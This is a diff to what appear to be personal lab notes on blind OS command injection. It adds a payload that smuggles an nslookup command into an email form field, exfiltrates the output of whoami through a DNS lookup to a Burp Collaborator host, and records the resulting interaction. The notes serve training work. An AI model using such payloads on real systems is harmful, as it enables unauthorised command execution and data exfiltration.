@@ -21,4 +21,7 @@ email=jan%40foo.net||nslookup+burpcollaborator.net||
 ```
 
 ## Blind OS command injection with out-of-band data exfiltration
-TODO: Burp Suite Professional
+```
+email=||nslookup+`whoami`.ttqw3(...).burpcollaborator.net||
+```
+Burp Collaborator interaction: `peter-WZSq1i.ttqw3gbwcea26g1r6yl4nup1lsrif7.burpcollaborator.net.`
